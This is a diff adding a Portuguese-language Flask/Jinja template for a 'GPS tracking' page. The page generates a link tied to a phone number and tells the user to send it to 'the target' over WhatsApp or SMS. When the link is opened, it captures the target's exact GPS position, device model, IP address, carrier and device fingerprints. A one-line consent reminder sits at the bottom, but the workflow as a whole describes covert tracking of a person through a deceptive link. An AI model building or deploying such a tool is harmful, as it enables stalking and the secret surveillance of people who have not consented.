@@ -1,0 +1,140 @@
+{% extends 'base.html' %}
+
+{% block title %}Rastreamento GPS{% endblock %}
+
+{% block content %}
+<div class="row justify-content-center">
+    <div class="col-lg-8 col-md-10">
+        <!-- Banner de título verde -->
+        <div class="bg-success text-white p-3 rounded-top text-center mb-0">
+            <h4 class="mb-0"><i class="fas fa-satellite me-2"></i>Rastreamento GPS</h4>
+        </div>
+        
+        <!-- Conteúdo em fundo escuro -->
+        <div class="bg-dark text-light p-4 rounded-bottom mb-4">
+            <div class="alert alert-info bg-primary bg-opacity-25 text-light border-0">
+                <i class="fas fa-info-circle me-2"></i>
+                Crie um link de rastreamento para um número de telefone. Quando acessado, este link irá coletar
+                a localização GPS em tempo real e dados detalhados do dispositivo.
+            </div>
+            
+            <form action="{{ url_for('create_tracking_link') }}" method="post" class="needs-validation mt-3" novalidate>
+                <div class="mb-4">
+                    <label for="phone_number" class="form-label fw-bold mb-2">Número de Telefone:</label>
+                    <div class="input-group mb-3">
+                        <span class="input-group-text bg-dark text-light border-secondary">
+                            <i class="fas fa-phone-alt"></i>
+                        </span>
+                        <input type="tel" name="phone_number" id="phone_number" 
+                               class="form-control form-control-lg bg-dark text-light border-secondary" 
+                               placeholder="+244 993 123 456" required
+                               pattern="[\+]?[(]?[0-9]{3}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}"
+                               title="Digite um número de telefone válido no formato internacional (+XXX)">
+                        <button type="submit" class="btn btn-primary px-4">
+                            <i class="fas fa-satellite-dish me-2"></i>Criar Link
+                        </button>
+                    </div>
+                    <div class="form-text text-secondary">
+                        Digite o número de telefone no formato internacional (ex: +244 957 123 456)
+                    </div>
+                </div>
+            </form>
+                
+                <div class="mt-4">
+                    <h5 class="border-bottom border-secondary pb-2 mb-3">Como Funciona o Rastreamento</h5>
+                    <div class="row">
+                        <div class="col-md-4 mb-3">
+                            <div class="card h-100 bg-dark border-secondary">
+                                <div class="card-body text-center">
+                                    <i class="fas fa-link text-success fa-2x mb-3"></i>
+                                    <h6 class="text-light">1. Gerar Link</h6>
+                                    <p class="small text-secondary">Você gera um link único de rastreamento para um número específico</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-4 mb-3">
+                            <div class="card h-100 bg-dark border-secondary">
+                                <div class="card-body text-center">
+                                    <i class="fas fa-share-alt text-success fa-2x mb-3"></i>
+                                    <h6 class="text-light">2. Compartilhar Link</h6>
+                                    <p class="small text-secondary">Envie o link de rastreamento para o alvo via WhatsApp, SMS, etc.</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-4 mb-3">
+                            <div class="card h-100 bg-dark border-secondary">
+                                <div class="card-body text-center">
+                                    <i class="fas fa-map-marker-alt text-success fa-2x mb-3"></i>
+                                    <h6 class="text-light">3. Receber Localização</h6>
+                                    <p class="small text-secondary">Quando o link for aberto, a localização exata e dados do dispositivo serão registrados</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="mt-4">
+                    <h5 class="border-bottom border-secondary pb-2 mb-3">Dados Coletados</h5>
+                    <div class="row">
+                        <div class="col-md-3 mb-3">
+                            <div class="d-flex">
+                                <div class="me-3">
+                                    <i class="fas fa-map-pin text-success fa-lg"></i>
+                                </div>
+                                <div>
+                                    <h6 class="mb-1 text-light">GPS Exato</h6>
+                                    <p class="small text-secondary mb-0">Coordenadas precisas</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3 mb-3">
+                            <div class="d-flex">
+                                <div class="me-3">
+                                    <i class="fas fa-mobile-alt text-success fa-lg"></i>
+                                </div>
+                                <div>
+                                    <h6 class="mb-1 text-light">Dispositivo</h6>
+                                    <p class="small text-secondary mb-0">Modelo e sistema</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3 mb-3">
+                            <div class="d-flex">
+                                <div class="me-3">
+                                    <i class="fas fa-network-wired text-success fa-lg"></i>
+                                </div>
+                                <div>
+                                    <h6 class="mb-1 text-light">Rede</h6>
+                                    <p class="small text-secondary mb-0">IP e operadora</p>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3 mb-3">
+                            <div class="d-flex">
+                                <div class="me-3">
+                                    <i class="fas fa-fingerprint text-success fa-lg"></i>
+                                </div>
+                                <div>
+                                    <h6 class="mb-1 text-light">Identificadores</h6>
+                                    <p class="small text-secondary mb-0">Digitais do dispositivo</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Botões de ação -->
+                <div class="d-flex justify-content-between align-items-center mt-4">
+                    <a href="{{ url_for('tracking_results') }}" class="btn btn-outline-light">
+                        <i class="fas fa-history me-2"></i>Ver Rastreamentos Anteriores
+                    </a>
+                    <span class="text-secondary small">
+                        <i class="fas fa-shield-alt me-1"></i>
+                        Use com responsabilidade e consentimento.
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
